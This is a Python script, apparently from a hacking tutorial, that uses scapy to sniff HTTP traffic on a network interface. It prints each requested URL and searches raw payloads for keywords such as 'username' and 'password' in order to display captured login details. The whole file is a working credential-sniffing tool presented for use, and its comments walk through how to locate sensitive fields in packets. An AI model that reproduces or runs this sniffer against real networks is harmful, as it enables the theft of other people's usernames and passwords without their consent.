import scapy.all as scapy
from scapy.layers import http
import optparse
import subprocess
# Please use this script only for HTTP websites and NOT for HTTPS websites!!


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface argument takes the interface over which we need to sniff packets
    # store is false, as we do not want to store data on our machine and fill space
    # prn argument takes the function that needs to be executed once the packet has been sniffed

    # udp is the protocol that is used to transfer videos and images as it is faster than tcp
    # You can also use any other protocol like ARP or any other port


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    # Given a sniffed packet, we extract the URL from it. URL is stored in the HTTP Request layer.
    # This can be known by running packet.show(), Host field contains the host web address and path field contains the
    # path.


# To sniff any data from a packet, follow these steps:
#   1. Sniff a packet, and run packet.show()
#   2. Locate the layer and field of the useful information, and use that.


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # Got to know about this layer by using packet.show()
        load = str(packet[scapy.Raw].load)
        # Raw is the layer and load is the field where we can find usernames and passwords
        keywords = ["username", "user", "login", "password", "pass"]  # Possibilities to find username and password
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # If the packet has an HTTP layer
        url = get_url(packet)
        print("[+] HTTP Request >>" + str(url))

        login_info = get_login_info(packet)
        if login_info:          # If the login info is extracted, every page does not have a login info
            print("\n\n [+] Possible username/password" + login_info + "\n\n")


def run():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Network Interface over which packets to be sniffed")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        print("[-] Insufficient arguments. Please try again")
    else:
        sniff(options.interface)


run()
